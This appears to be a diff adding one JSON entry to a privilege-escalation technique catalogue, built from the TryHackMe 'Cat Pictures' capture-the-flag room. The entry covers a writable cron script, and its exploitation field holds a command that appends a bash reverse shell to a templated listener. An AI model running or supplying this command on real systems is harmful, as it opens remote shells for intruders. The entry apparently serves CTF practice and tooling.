@@ -1,0 +1,1 @@
+{"id":"writable_cron_clean","category":"WRITABLE_CRON","binary":"clean.sh","cve":null,"exploitation":["echo 'bash -i >& /dev/tcp/{{listener_ip}}/{{listener_port}} 0>&1' >> {{binary}}"],"source":"tryhackme/Cat Pictures","tags":["cron","writable","ctf"],"severity":"high"}
